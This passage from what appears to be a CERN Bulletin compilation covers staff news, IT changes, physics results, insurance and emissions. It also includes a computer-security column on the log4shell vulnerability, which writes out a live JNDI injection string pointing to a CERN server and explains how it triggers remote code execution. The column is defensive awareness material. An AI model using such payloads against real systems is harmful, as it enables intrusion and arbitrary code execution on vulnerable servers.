And, who knows, the presentations might even help some to discover their vocation!
And there’s something for grown-ups too!  CERN will be hosting a screening of the feature film Picture a Scientist at 8.00 p.m. on 10 February at the Globe of Science and Innovation.
This documentary (in English with French subtitles) follows the careers of researchers who are blazing the trail for women in science.
The screening will be followed by a panel discussion (in English with simultaneous French interpretation) with experts in matters of gender and diversity in the sciences.

Skype for Business to be phased out by 30 June 2022.
The Skype for Business service will be phased out by 30 June 2022.
Skype for Business is reaching the end of its support by Microsoft and the current service at CERN relies on old hardware and an obsolete version of Windows.
For telephony services, Skype for Business is replaced by CERNphone, a softphone client available for desktops and laptops running Windows, MacOS or Linux and for Android and Apple mobile phones.
A CERN mobile subscription is not necessary to use CERNphone on a mobile phone: CERNphone can be used with private subscriptions – calls are free when connected to Wi-Fi, which is available in all offices at CERN, as well as many other areas.
Skype for Business users will be contacted individually concerning the migration to CERNphone, but if you would like to switch today then please follow the migration and installation guide.
The chat functionality of Skype for Business is replaced by the Mattermost service, which (like CERNphone) is available for mobile phones as well as desktops and laptops.
The video functionality of Skype for Business is replaced by the Zoom service, which is also available on mobile phones, tablets, desktops and laptops.
Work to replace the different functions of Skype for Business has been carried out in the context of the recent MALT project.

CERN access card security campaign: update.
A campaign to increase the security of the CERN access cards has been under way since December.
Almost half of all access cards have already been updated through a quick scan by security guards at the site entrances, at the registration service office or in the restaurants.
However, the new COVID-19 measures at CERN (level four) impact the physical presence of employees on site and therefore the capacity to re-encode cards at a sustained rate.
Consequently, those whose cards haven’t been updated will still be granted access to CERN’s sites up to March 2022 (as opposed to January, as was originally planned).
In the next few weeks, those present on the CERN site will receive targeted emails reminding them to update their card at the following locations:
Building 55 (1st floor) Building 33 (reception) Entrance B (security guard) Prévessin entrance (security guard)
Even past the deadline, anyone can still have their card re-encoded at one of the stations listed above.
The organisers are very grateful to everyone at CERN who has contributed to the success and speed of the upgrade so far.
Check if your card needs updating by logging in to ADaMS or ADaMS mobile.
76666: new hotline for the Access Control Centre.
CERN’s Access Control Centre (known by its French acronym, CSA), which is managed by the Site and Civil Engineering department’s Security Service, can now be reached at a single number: 76666.
(The CSA’s old numbers – 78877 and 78878 – are automatically redirected to 76666.)
The CSA is open 24 hours a day, seven days a week, and is there to answer all your security-related questions, from how to access CERN, car parking, roadmarking requests, lost property and suspicious or unattended packages to antisocial conduct, criminal acts, suspicious behaviour, etc.
You can also contact the CSA by email at the following address:
Reminder: In the event of an emergency or to report an accident, call the CERN Fire and Rescue Service on 74444.
Internal communications survey: change the way you get informed on CERN matters! (reminder).
Take this 5-minute survey to help us improve CERN’s internal communication channels, with a particular focus on the CERN Bulletin
With 57 years and counting behind it, the CERN Bulletin has been the Laboratory’s internal newsletter for most of its existence.
Since the days when a print copy was distributed to each office, the Laboratory and its community have changed a lot, and the Bulletin has always adapted to keep up with this evolution and growth.
In parallel, new ways of keeping you informed have budded over the years, such as departmental newsletters, internal screens and panels at the sites’ entrances.
In the light of the profound changes that CERN is currently undergoing, we think that the time has come for all these communication channels to be rethought and reshaped, to ease access to information, better engage with you and promote the feeling of community that we hold dear.

Three-year MALT project comes to a close.
At the end of 2021, the three-year MALT project, working to rationalise the provision of software licences at CERN, ended.
The important lessons learned from this project will now be applied across all related activities at the Organization.
Like most large organisations, CERN makes use of software – both commercial and open source – to support its core work.
The IT department provides software to those who need it across the Laboratory.
In cooperation with the IPT department, the IT department supports the CERN community by negotiating and purchasing the licences for the commercial software that is required.
Over recent years, numerous companies have moved from a “campus” to a “cloud” model of software provision.
Many now require a specific number of people – or even named individuals – to be associated with licences, often resulting in marked price increases.
To address this, the MALT project was launched in 2019 with the hiring of six fellows.
Since then, the project has helped the Organization to rationalise licences, identify alternative software where appropriate and negotiate improved licensing deals with key software vendors.
The project has also helped us to learn valuable lessons about providing software licences across a unique – and highly heterogeneous – organisation like CERN.
The six key lessons are as follows:
Accounting: Knowing the total costs associated with software can help us all to make better, informed decisions.
Eligibility: Based on the above, the IT department has learned the importance of defining clear eligibility criteria – based on needs – for licensed products.
This ensures that costs don’t automatically spiral when personnel numbers grow.
Standardisation: Where markets are mature, we should rely on out-of-the-box software.
Minimising customisation where it is not strictly necessary ensures services remain manageable and affordable and can be upgraded or replaced easily.
User engagement: Strong channels for communication and inter-departmental governance help the IT department to understand needs and provide appropriate software, differentiating requirements in a fine-grained manner.
Architecture: Software products should not be seen independently, but rather as part of a soundly architected user-centric technology landscape across the Organization.
Data governance: Solutions provided via the cloud must be compliant with CERN policies on security, data ownership and data privacy.
These lessons will now be applied to all decision-making processes related to software licensing: both those currently under way and those that arise in future.
Given that this move to a cloud licensing model is part of a wider trend among software vendors, it is also vital to ensure that we have personnel with expertise in cloud licensing located in the relevant teams at CERN – both within the IT department and beyond.
“One of several situations that led to the launch of the MALT project in 2019 was the proposed increase in licensing costs for key software vendors,” says Maite Barroso Lopez, the former leader of the MALT project and Deputy Head of the CERN IT department.
“MALT has helped us to rationalise how licences are used across our wider community, reducing waste and freeing up the space to focus our relationships with vendors on new and strategic technologies that support CERN's mission.”
“With the MALT umbrella project coming to a successful close, we will put the lessons to work,” says Enrica Porcari, Head of the CERN IT department.
“We believe the MALT project has put us in a good position to help our communities have easy and timely access to the right tools to do their work as efficiently and effectively as possible.”
CERN computer servers set sail for Lebanon.
On 14 January, CERN representatives met with a Lebanese delegation to celebrate the shipping of donated computer servers to Lebanon following a fundraising campaign for the High-Performance Computing for Lebanon (HPC4L) project
A year and a half after the explosion in the port of Beirut, Lebanon is still struggling to recover from a serious economic and social crisis that has paralysed this partner state of CERN, which has four universities affiliated to the CMS collaboration.
International solidarity is more necessary than ever to shore up the country’s tradition of academic excellence and support its scientific community.
In this context, developments such as the donation of CERN computing equipment offer a glimmer of hope amidst Lebanon’s setbacks.
The long-awaited fruition of this project, known as HPC4L, was marked on Friday 14 January at a meeting between Joachim Mnich (CERN Director for Research and Computing), Enrica Porcari (Head of the Information Technology department at CERN), representatives of the Lebanese scientific community and of the foundations that have pledged financial support, and the Ambassador of Lebanon to the international organisations in Geneva.
In 2016, the project, which was initiated by the CERN Adviser for the Middle East and North Africa Region, Martin Gastal, set out to boost Lebanon’s research capacity and secured the contribution of CERN, through the Organization’s Information Technology department, in the form of computer servers.
The servers will make it possible to develop the computing capacity available to the Lebanese academic community in support of all kinds of research activities, including in high-energy physics.
However, the servers could not be transported to Lebanon because of the crisis that was gripping the country, which reduced the funds available in the Lebanese institutes.
Thanks to a successful fundraising campaign, organised by the CMS collaboration and the Sharing Knowledge Foundation (SKF), the necessary funds have been raised to cover the cost of shipping the hardware, purchasing the equipment required to install it and training Lebanese technical staff at CERN.
The international scientific community and the Lebanese diaspora, both of which proved particularly generous, helped make the fundraising campaign – and therefore the threatened project – a success, thereby illustrating their solidarity with Lebanon’s academic institutions and boosting the country’s research capacity.
The commitment of the French embassy in Lebanon, which provides financial aid to participate in the training costs of the Lebanese personnel in charge of the operation and maintenance of the computer servers, has also facilitated the concrete implementation of the project.
Now that the funds have been raised, the servers will immediately set sail for Lebanon, where their new owners and users will be awaiting their arrival in the port of Beirut.
CERN is sending 144 computing servers, containing a total of 3456 cores.
In addition, CERN is supplying storage capacity by sending 24 disk servers that will provide over 1 petabyte.
This equipment is donated from the CERN data centre, which forms the heart of the Worldwide LHC Computing Grid (WLCG). The WLCG is used to store and analyse data from the LHC experiments.
The equipment will then be installed in a dedicated computing centre that will be run by a public–private consortium whose technical staff will be trained at CERN by CMS experts once the installation of the servers, scheduled for March 2022, is complete.
Once that final hurdle has been cleared, the universities will be able to start using the facility to develop their research and to participate in the WLCG, which includes 170 computing centres in 42 countries across the globe.
It has been a long and tortuous road since the project began, but a happy ending is now in sight, thanks to the perseverance of all those in Lebanon, Europe and around the world who have invested their time and resources to help consolidate scientific research in Lebanon.
Visit the dedicated website to find out more about the project and its partners (MoT/OGERO, AUB, LAU, USJ, LU, USEK, BAU, CNRS, Tamari Foundation, Eudoxia Foudation.
Since 2012, CERN has regularly donated computing equipment that no longer meets its highly specific requirements on efficiency but is still more than adequate for less exacting environments.
To date, a total of 2524 servers and 150 network switches have been donated by CERN to countries and international organisations, namely Algeria, Bulgaria, Ecuador, Egypt, Ghana, Mexico, Morocco, Lebanon, Nepal, Palestine, Pakistan, the Philippines, Senegal, Serbia, and the SESAME laboratory in Jordan.
CERN strives to maximise its positive impact on society: these donations can play an important role in providing opportunities for researchers and students in their home countries, thus helping to avoid so-called ‘brain-drain’ scenarios.
ISOLDE data get deluxe theoretical treatment.
A unique combination of high-quality experimental data and several state-of-the-art nuclear-physics models has resulted in an excellent agreement between experiment and theory
The atomic nucleus is a tough nut to crack.
The strong interaction between the protons and neutrons that make it up depends on many quantities, and these particles, collectively known as nucleons, are subject to not only two-body forces but also three-body ones.
These and other features make the theoretical modelling of atomic nuclei a challenging endeavour.
In the past few decades, however, ab initio theoretical calculations, which attempt to describe nuclei from first principles, have started to change our understanding of nuclei.
These calculations require fewer assumptions than traditional nuclear models, and they have a stronger predictive power.
That said, because so far they can only be used to predict the properties of nuclei up to a certain atomic mass, they cannot always be compared with so-called DFT calculations, which are also fundamental and powerful and have been around for longer.
Such a comparison is essential to build a nuclear model that is applicable across the board.
In a paper just published in Physical Review Letters, an international team at CERN’s ISOLDE facility shows how a unique combination of high-quality experimental data and several ab initio and DFT nuclear-physics calculations has resulted in an excellent agreement between the different calculations, as well as between the data and the calculations.
“Our study demonstrates that precision nuclear theory from first principles is no longer a dream,” says Stephan Malbrunot of CERN, the first author of the paper.
“In our work, the calculations agree with each other, as well as with our ISOLDE data on nickel nuclei, to within a small theoretical uncertainty.”
Using a suite of experimental methods at ISOLDE, including a technique to detect the light emitted by short-lived atoms when laser light is shone on them, Malbrunot and colleagues determined the (charge) radii of a range of short-lived nickel nuclei, which have the same number of protons, 28, but a different number of neutrons.
These 28 protons fill a complete shell within the nucleus, resulting in nuclei that are more strongly bound and stable than their nuclear neighbours.
Such “magic” nuclei are excellent test cases for nuclear theories, and in terms of their radius, nickel nuclei are the last unexplored magic nuclei that have a mass within the mass region at which both ab initio and DFT calculations can be made.
Comparing the ISOLDE radii data with three ab initio calculations and one DFT calculation, the researchers found that the calculations agree with the data, as well as with each other, to within a theoretical uncertainty of one part in a hundred.
“An agreement at this level of precision demonstrates that it will eventually become possible to build a model that is applicable across the whole chart of nuclei,” says Malbrunot.
Administrative Circular No. 11 (Rev. 7) – Categories of Members of the Personnel.
Administrative Circular No. 11 (Rev. 7), entitled “Categories of Members of the Personnel”, approved by the Director-General, is now available via the following link.
This revision cancels and replaces Administrative Circular No. 11 (Rev. 6), entitled “Categories of Members of the Personnel”, dated September 2018.
The main modifications are summarised below:
Introduction of a new subcategory of associates: experiment associates (new paragraph 23 of AC11)
The new paragraph details the profile and level of expertise required of experiment associates (EXAS) and specifies the minimum and maximum duration of their contract and appointment.
“23.
Experiment Associates shall be scientists, engineers or technicians admitted by the Organization to contribute specialised technical or coordination expertise on behalf of their home institution to the execution of experiment-related activities designated by the experiment collaboration, under an agreement between the Organization, as Host Laboratory, and their home institution.
They shall be employed by their home institution.
The minimum duration of an appointment as an experiment associate shall be six months.
The total maximum duration of an appointment as an experiment associate shall not exceed eight years.”
Mandatory break for the payment of a subsistence allowance
The introduction of the new subcategory had to be included in paragraph 40 (now 41) regarding mandatory breaks.
It is specified that a break of payment will not apply in case of transition from a project associate (PJAS) contract to an EXAS contract.
Other minor changes
Other minor changes include, inter alia, the introduction of the notion of the cost-of-living allowance (COLA), in a manner similar to what was already done in the Staff Rules (footnote to article S V 1.01), and the updating of subsistence allowance amounts in annex 1.
Paragraphs 18, 24 (now 25) and 31 (now 32) of the Circular have also been amended to align the wording regarding the obligation of associated members of the personnel (MPA) to maintain a legal link with their home institution throughout the duration of their contract of association.
The revised Circular has entered into force on 1 January 2022.

A crunching multiverse to solve two physics puzzles at once.
A duo of theorists proposes a new theory to explain both the surprisingly small mass of the Higgs boson and the puzzling symmetry properties of the strong force
The discovery of the Higgs boson was a landmark in the history of physics.  It explained something fundamental: how elementary particles that have mass get their masses.
But it also marked something no less fundamental: the beginning of an era of measuring in detail the particle’s properties and finding out what they might reveal about the nature of the universe.
One such property is the particle’s mass, which at 125 GeV is surprisingly small.
Many theories have been put forward to explain this small mass, but none has so far been confirmed with data.
In a paper just published in Physical Review Letters, Raﬀaele Tito D’Agnolo of the French Alternative Energies and Atomic Energy Commission (CEA) and Daniele Teresi of CERN propose a new theory to explain both the lightness of the Higgs boson and another fundamental physics puzzle.
In broad brushes, the duo’s theory works like this.  In its early moments, the universe is a collection of many universes each with a different value of the Higgs mass, and in some of these universes the Higgs boson is light.
In this multiverse model, universes with a heavy Higgs boson collapse in a big crunch in a very short time, whereas universes with a light Higgs boson survive this collapse.
Our present-day universe would be one of these surviving light-Higgs universes.
What’s more, the model, which includes two new particles in addition to the known particles predicted by the Standard Model, can also explain the puzzling symmetry properties of the strong force, which binds quarks together into protons and neutrons, and protons and neutrons into atomic nuclei.
Although the theory of the strong force, known as quantum chromodynamics, predicts a possible breakdown in strong interactions of a fundamental symmetry called CP symmetry, such a breakdown is not observed in experiments.
One of the new particles in D’Agnolo and Teresi’s model can solve this so-called strong CP problem, making strong interactions CP symmetric.
Moreover, the same new particle could also account for the dark matter that is thought to make up most of the matter in the universe.
The jury is of course out on whether the new model, or any of the many other models that have been proposed to explain the Higgs boson mass or the strong CP problem, will fly.
“Each model comes with perks and limitations,” says Teresi.
“Our model stands out because it is simple, generic and it solves these two seemingly unrelated puzzles at once.
And it predicts distinctive features in data from experiments that aim to search for dark matter or for an electric dipole moment in the neutron and other hadrons.”
Other recent theoretical proposals to explain the Higgs mass include the relaxion field model, a new phenomenon in quantum cosmology and the selfish Higss model, to mention a few.
Older, more traditional theories are based on a Higgs boson that is a composite particle or on a new type of symmetry called supersymmetry.
Only time and data will tell which – if any – of the models will prevail.
ATLAS gives new insight into the internal structure of the proton.
During the Lepton Photon Conference this week, the ATLAS collaboration presented a new paper that describes how partons interact within the proton
While the Large Hadron Collider (LHC) is well known for smashing protons together, it is actually the quarks and gluons inside the protons – collectively known as partons – that are really interacting.
Thus, in order to predict the rate of a process occurring in the LHC – such as the production of a Higgs boson or an as-yet-unknown particle – physicists have to understand how partons behave within the proton.
This behaviour is described in parton distribution functions (PDFs), which describe what fraction of a proton’s momentum is taken by its constituent quarks and gluons.
Knowledge of PDFs has traditionally come from lepton–proton colliders, such as HERA at DESY.
These machines use point-like particles, such as electrons, to directly probe the partons within the proton.
Their research has revealed that, in addition to the well-known up and down quarks that are inside a proton, there is also a sea of other quark–antiquark pairs in the proton.  This sea is theoretically made of all types of quarks, bound together by gluons.
Now, studies of the LHC’s proton–proton collisions are providing a detailed look at PDFs, in particular the proton’s gluon and quark-type composition.
The ATLAS collaboration has just released a new paper combining LHC and HERA data to determine PDFs.
The result uses ATLAS data from several different Standard Model processes, including the production of W and Z bosons, pairs of top quarks and hadronic jets (collimated sprays of particles).
The strange quark’s contribution to PDFs was expected to be lower than that of lighter quarks.
The new paper confirms a previous ATLAS result, which found that the strange quark is not substantially suppressed at small proton momentum fractions and extends this result to show how suppression kicks in at higher momentum fractions.
Several experiments and theoretical groups around the world are working to understand PDFs, as variance in these results could impact high-energy searches for physics beyond the Standard Model.
Achieving high-accuracy PDFs is needed if physicists are to find evidence for new-physics processes – which is where the ATLAS analysis contributes most powerfully. 
The ATLAS collaboration is able to assess the correlations of the systematic uncertainties between their datasets and account for them – an ability put to great effect in their new PDF result.
Such knowledge was not previously available outside ATLAS, making this result a new “vademecum” for global PDF groups.

Computer security: Unwanted presents.
Last year ended with a nasty surprise for the computer security community in particular and the IT community more generally.
Published in early December, the “log4shell” vulnerability (link 1 ; link 2), found in Apache’s “log4j” Java logging library, affects nearly everything.
Java is prevalent and embedded in many (too many?) websites, applications, firmware and so on.  This makes it hard to fix, in particular with the impending Christmas period, when everyone wants to leave for vacation and the attackers are readily preparing to strike. Unwanted presents under the Christmas tree. 
“log4j” is a Java library used by developers and application managers to monitor activity within their application or website in detail.
This logging makes it possible to pinpoint problems, misbehaviour and areas for improvement.
Given that it is a Java library, it is a fundamental building block and used in many modern software packages.
This is what makes the recent vulnerability found in log4j “the most serious vulnerability I’ve seen” (according to US Cybersecurity and Infrastructure Security Agency Director Jen Easterly) as more than 35 000 Java packages, amounting to over 8% of the Maven Central Repository (the most significant Java package repository), have been found to be impacted by the recently disclosed log4j vulnerabilities.
And these are only those found in a single repository*.
The vulnerability is simple and efficient, leading directly to remote code execution (RCE) if the logging data contains any malicious payload (like ${jndi:ldap://188.185.91.34:1337/a}), where in this particular case the IP address 188.185.91.34 points to a benign CERN server.
The log4j vulnerability is triggered by this payload and the server makes a request to 188.185.91.34 via the Java Naming and Directory Interface (JNDI).
In the sad reality of computer attacks, that IP address would be an attacker-controlled server that would respond with a remote Java class file injected into the log4j’s server process and allow the attacker to execute arbitrary code.
The simplicity of the attack, in particular because it only requires a single input field in a public or internet-facing web service or application, is what makes it so dangerous. Jackpot for the attacker.
Understandably, the computer security and IT communities were not amused.  Christmas.  Vacation.  And an unwanted present under their Christmas tree.
The underlying problem, however, is not log4j.
As with Heartbleed a few years ago, the main issue is the lack of knowledge of where a particular library, whether log4j or Heartbleed’s “openssl”, is used.
A lack of inventory.  A lack of dependency management.
When you don’t know, mitigation is impossible.
It becomes even more complicated if software is (automatically) imported from remote sources (see our Bulletin article on “A new twist for those who rely on external software”).  
Like using free and open-source software (FOSS). While FOSS is meant to be reused, this does not guarantee support, updates or the absence of security flaws, especially for small projects or those without proper support/funding.
And, in particular, when some (powerful) beneficiaries take the code without participating in the community nor contributing to the project themselves… Central repositories like Gitlab and central registries definitely help under certain circumstances.
For example, the CERN Computer Security team was able to contact all the owners of potentially affected Openshift projects thanks to its central inventory**.
Full inventories, the so-called “software bill of materials” (SBOM), would definitely help further once implemented (find some presentations on that at Likewise, curation tools like “Nexus” or “Snyk” ( might also help, but would need to be deployed first (see our plea in Bulletin article “Fancy dinner or burned pie?”).
Fortunately, so far, neither CERN’s intrusion detection system nor the logs of CERN’s outer perimeter firewall have detected any successful exploitation of this unwanted present.
While the Computer Security team has scanned for any potentially vulnerable web applications and alerted the corresponding owners, we are counting on you to check and mitigate your applications and websites, if you haven’t done so already, in order to avoid any post-Christmas surprises!
Unwanted presents go straight to the dustbin!  Do you want to learn more about computer security incidents and issues at CERN?

* A list of affected software can be found at:
** Funnily enough, 50% of the Openshift-hosted projects whose owners were notified were deleted immediately.
It looks like CERN really needs a better resource life cycle as those, apparently unimportant, projects block resources and pose a latent security risk.
Swiss and French legitimation cards: enhanced cooperation between the Cards Office and the Registration service from January 2022.
Following the excellent cooperation put in place since the start of the COVID-19 pandemic for an optimal management of Swiss and French legitimation cards, from January 2022, the Cards Office and the Registration service will strengthen their collaboration on a more permanent basis.
From January 2022, for the submission of documents, the return and withdrawal of Swiss and French legitimation cards, members of the personnel(1) must report exclusively to the Registration service (building 55/R-001) from 1:30 p.m. to 6.30 p.m.  Monday to Friday.
The Registration service will collect and verify the legibility and compliance of the documents, ensure that the files are complete and issue, if applicable, and in particular upon return of cards, a certified true copy of said cards.
Once the documents have been sent by the Registration service to the Cards Office, the latter will process the requests with the authorities of the Host States, and remain the main point of contact for any advice or information on the various processes related to Swiss and French legitimation cards (see the relevant pages of the admin e-guide(2)).
Users (USER), Cooperation Associates (COAS) and Visiting Scientists (VISC) should continue to liaise with the Users' Office.

Dorota Gaweda and Egle Kulbokaite win Collide residency award.
The Polish–Lithuanian duo, based in Switzerland, were selected as the winners of this year’s edition alongside three Honorary Mentions
Polish artist Dorota Gawęda and Lithuanian artist Eglė Kulbokaitė, a duo based in Basel, Switzerland, have been selected as the winners of this year’s edition of the Collide award alongside three Honorary Mentions.
Collide is the flagship programme of Arts at CERN, which invites artists worldwide from all creative disciplines to submit proposals for a research-led residency based on interaction with CERN’s scientific community.
This year’s Collide residency award received 388 submissions from 75 countries.
Working together since 2013, Dorota Gawęda and Eglė Kulbokaitė’s multi-faceted practice navigates between performance, fragrance, installation, sculpture, video and painting, all of which are rooted in feminist theory and fiction.
Their winning proposal is entitled “Gusla” and derives from Polish rural folklore.
In 2022, Dorota Gawęda and Eglė Kulbokaitė will extend their collaborative practice during a two-month residency at CERN, working with scientists, engineers and staff of the Laboratory.
Later, they will spend one month in Barcelona connecting and engaging in dialogue with scientists from the city while being hosted at the Hangar Centre for Art Research and Production.
The artists are deeply inspired by fundamental physics, especially how quantum physics in relation to living organisms exposes the “strangeness” of the world.  “We hope that the engagement with quantum physics has the potential to break normative patterns of human behaviour and negotiate new ways of relating to the natural world,” the duo declare.
Engaging with concepts from fundamental physics and drawing from Eastern European summoning rituals, their research calls forth speculative worlds and fictions.
Additionally, the jury selected three Honorary Mentions: Indonesian filmmaker Riar Rizaldi, New Zealand-based collective The Observatory Project and Barcelona-based Colombian artist María Paz.
They will be invited to take part in Arts at CERN’s Guest Artists programme – a short stay at the Laboratory to engage with CERN’s research and community and investigate ideas to support their proposals.
The jury was composed of Mónica Bello, Curator and Head of Arts at CERN, Geneva; Valentino Catricalà, Curator of the SODA Gallery, Manchester; Lluis Nacenta, Director of Hangar, Barcelona; Rosa Pera, independent curator, Barcelona; and Helga Timko, Accelerator Physicist at CERN, Geneva.
Collide has been organised in collaboration with Barcelona’s Institute of Culture and Barcelona City Council since 2019 as part of a three-year collaboration (2019–2021).

Introduction of a new and improved “Allianz Care” healthcare plan for CERN MPAs as of 1 January 2022.
As of 1 January 2022, a new and improved Allianz health insurance plan is in place for CERN MPAs (associated members of personnel, e.g. users) and their accompanying family members (financially dependent spouse or partner and children who are living in France or Switzerland).
The new plan has replaced the previous plan that had been available since 2015.
The conditions and benefits fulfil CERN’s requirements of adequate health insurance cover in Switzerland and France, as well as in any countries visited on duty travel.
Main improvements compared to the previous plan:
Any cover period possible between 30 days (minimum) and 1 year (maximum), with the possibility of extension Lower premiums and different premiums for adults and children (80% of adult premiums).
30-days premiums for adults under the new plan: 309,09 euros (247,27 euros for children).
Annual premiums for adults: 3760,61 euros (3008,49 euros for children).
In case of coverage of less than a year, premiums are pro-rated accordingly.  Payments by credit card or bank transfer (single payment or quarterly payments)
Expat assistance programme, travel security service Health and wellness support programme, digital health app, MyHealth Digital Services Second medical opinion service
The insurance is valid worldwide, with the exception of the United States, where only emergency cover is available.
No health examination or questionnaire is required and pre-existing conditions are not excluded from the cover.
To be eligible, the MPA and family members must all be under the age of 75 on the date on which their cover begins and have a valid contract of association with CERN.
For future MPAs, the attestation of pre-registration of association with CERN is sufficient.
In addition to the above, cover for members residing in Switzerland without a valid Swiss legitimation card “P” is limited to an overall maximum period of 90 days.
The platform for subscription to the new plan, including a table of benefits and benefit guide, is available at:

A very exciting year ahead.
I’d like to welcome you back and wish you all a very happy new year.
I hope you managed to have a restful and enjoyable break.
We have a very exciting year ahead of us as LHC Run 3 gets under way, the FCC Feasibility Study continues to progress and we celebrate the 10th anniversary of the discovery of the Higgs boson – to cite just three of the highlights that await us.
The epidemiological situation has obliged us to move to COVID Level 4 – Red as the year begins.
This does not equate to a return to safe mode, and I hope it will be short-lived.
Despite the fact that the now-dominant Omicron variant is highly transmissible, there are promising indicators that it may lead to less severe illness.
We will be monitoring the situation carefully, with a view to relaxing our COVID level as soon as it is safe to do so.
In the meantime, the Directorate’s traditional beginning-of-the-year presentation on 13 January will be fully online.
We’ll be taking a look back at the remarkable accomplishments of 2021, made possible thanks to the hard work of the full CERN community, and we’ll be looking forward to a great year ahead.
I hope that many of you will be able to join us.
The meeting will be held by webcast only.

Environmental awareness: Greenhouse gas emissions.
With climate change a growing concern, the Organization is committed to reducing its greenhouse gas emissions
The recent UN Climate Change Conference (COP26) in Glasgow once again stressed the importance of combatting climate change through the reduction of greenhouse gas emissions.
CERN is committed to participating in this combat.
The first step in this endeavour is to accurately monitor the Organization’s greenhouse gas emissions following the Greenhouse Gas Protocol’s nomenclature, which breaks down emissions into three scopes: scope 1 refers to the direct carbon dioxide equivalent (CO2e) emissions resulting from an organisation’s facilities, scope 2 refers to indirect CO2e emissions, for example related to the generation and supply of electricity, while scope 3 refers to indirect CO2e emissions occurring upstream and downstream of an organisation’s activities, such as those linked to mobility and waste.
CERN’s direct CO2e emissions (scope 1) arise from the Laboratory’s industrial infrastructure and on-site activities, such as heating, air conditioning and the vehicle fleet, but the vast majority are generated by the gases in the LHC experiments.
These large experiments use a wide range of gas mixtures, including fluorinated gases (F-gases), for particle detection and detector cooling purposes.
More than 78% of CERN’s direct emissions is due to F-gases, some of which have high Global Warming Potential (GWP)*.
The Organization set itself the objective of reducing its direct CO2e emissions by 28% by the end of 2024 (baseline year: 2018).
Because of their major contribution, F-gases are the main focus of these mitigation efforts and CERN has developed an R&D strategy based on gas recuperation, optimisation of current technologies and replacement with more environmentally friendly gases.
During LS2, the Organization took important steps towards replacing F-gases with CO2, which has a substantially lower GWP, in detector cooling systems.
The experiments also carried out a leak repair campaign and investigated environmentally friendly gas mixtures.
Despite the difficulties arising from the COVID-19 pandemic, most planned repairs have been or are being carried out.
The indirect emissions related to CERN’s electrical power supply and consumption (scope 2) are relatively low as the Laboratory procures low-carbon electricity.
Nevertheless, the Organization is committed to limiting its increase in electricity consumption to 5% up to the end of 2024.
During LS2, CERN consumed about 64% less electricity, which had a knock-on effect on energy-related emissions.
In 2020 and for the first time, CERN assessed its scope 3 CO2e emissions, such as those arising from business travel, personnel commutes, catering, waste and water purification.
This estimate marks an important step in understanding and controlling the Laboratory’s overall emissions.
Emissions related to personnel commutes and to long-distance flights in the framework of business travel make up the bulk of CERN’s scope 3 emissions.
CERN’s goals are to keep individual motorised vehicle commuting constant by 2025, despite a growing scientific community, and to better understand and monitor emissions deriving from the Laboratory’s procurement.
A project was launched by the IPT department in 2021 to address this second goal.
More information about CERN’s scope 3 emissions and their reduction priorities can be found in the latest Environment Report.
In addition to setting reduction objectives and mitigation measures, CERN discusses its carbon footprint in international forums, such as the EIROforum, where representatives of eight major research organisations in Europe share their respective experiences.
This article is part of the series “CERN’s Year of Environmental Awareness”.
* Global Warming Potential (GWP) is defined as the cumulative radiative forcing impact of one unit of a given greenhouse gas, relative to one unit of CO2, over a period of time.
In practice, it allows comparisons of the global warming impacts of different gases.
Data Protection Day 2022: “BIG personal DATA protection”.
After the success of last year's event, four EIROforum organisations – CERN, EMBL, ESA and ESO – join forces to bring you a shared webinar on data protection on Friday 28 January 2022 from 12 to 2 p.m.

BASE breaks new ground in matter–antimatter comparisons.
The collaboration has made the most precise comparison yet between protons and antiprotons and tested whether or not they behave in the same way under the influence of gravity
In a paper published today in the journal Nature, the BASE collaboration at CERN reports the most precise comparison yet between protons and antiprotons, the antimatter counterparts of protons.
Analysing proton and antiproton measurements taken over a year and a half at CERN’s antimatter factory, a unique facility for antimatter production and analyses, the BASE team measured the electric charge-to-mass ratios of the proton and the antiproton with record precision.
The results found these are identical to within an experimental uncertainty of 16 parts per trillion.
“This result represents the most precise direct test of a fundamental symmetry between matter and antimatter, performed with particles made of three quarks, known as baryons, and their antiparticles,” says BASE spokesperson Stefan Ulmer.
According to the Standard Model, which represents physicists’ current best theory of particles and their interactions, matter and antimatter particles can differ, for example in the way they transform into other particles, but most of their properties, including their masses, should be identical.
Finding any slight difference between the masses of protons and antiprotons, or between the ratios of their electric charge and mass, would break a fundamental symmetry of the Standard Model, called CPT symmetry, and point to new physics phenomena beyond the Model.
Such a difference could also shed light on why the universe is made up almost entirely of matter, even though equal amounts of antimatter should have been created in the Big Bang.
The differences between matter and antimatter particles that are consistent with the Standard Model are smaller by orders of magnitude to be able to explain this observed cosmic imbalance.
To make their proton and antiproton measurements, the BASE team confined antiprotons and negatively charged hydrogen ions[1], which are negatively charged proxies for protons, in a state-of-the-art particle trap called a Penning trap.
In this device, a particle follows a cyclical trajectory with a frequency, close to the cyclotron frequency, that scales with the trap’s magnetic-field strength and the particle's charge-to-mass ratio.
Alternately feeding antiprotons and negatively charged hydrogen ions one at a time into the trap, the BASE team measured, under the same conditions, the cyclotron frequencies of these two kinds of particle, allowing their charge-to-mass ratios to be compared.
Performed over four campaigns between December 2017 and May 2019, these measurements resulted in more than 24000 cyclotron-frequency comparisons, each lasting 260 seconds, between the charge-to-mass ratios of antiprotons and negatively charged hydrogen ions.
From these comparisons, and after accounting for the difference between a proton and a negatively charged hydrogen ion, the BASE researchers found that the charge-to-mass ratios of protons and antiprotons are equal to within 16 parts per trillion.
“This result is four times more precise than the previous best comparison between these ratios, and the charge-to-mass ratio is now the most precisely measured property of the antiproton.” says Stefan Ulmer.
“To reach this precision, we made considerable upgrades to the experiment and carried out the measurements when the antimatter factory was closed down, using our reservoir of antiprotons, which can store antiprotons for years.”
Making cyclotron-frequency measurements when the antimatter factory is not in operation is ideal, because the measurements are not affected by disturbances to the experiment’s magnetic field.
In addition to comparing protons and antiprotons with an unprecedented precision, the BASE team used their measurements to place stringent limits on models beyond the Standard Model that violate CPT symmetry, as well as to test a fundamental physics law known as the weak equivalence principle.
According to this principle, different bodies in the same gravitational field undergo the same acceleration in the absence of friction forces.
Because the BASE experiment is placed on the surface of the Earth, its proton and antiproton cyclotron-frequency measurements were made in the gravitational field on the Earth’s surface.
Any difference between the gravitational interaction of protons and antiprotons would result in a difference between the proton and antiproton cyclotron frequencies.
Sampling the varying gravitational field of the Earth as the planet orbits around the Sun, the BASE scientists found no such difference and set a maximum value on this differential measurement of three parts in 100.
“This limit is comparable to the initial precision goals of experiments that aim to drop antihydrogen in the Earth’s gravitational field,” says Ulmer.
“BASE did not directly drop antimatter in the Earth’s gravitational field, but our measurement of the influence of gravity on a baryonic antimatter particle is conceptually very similar, indicating no anomalous interaction between antimatter and gravity at the achieved level of uncertainty.”
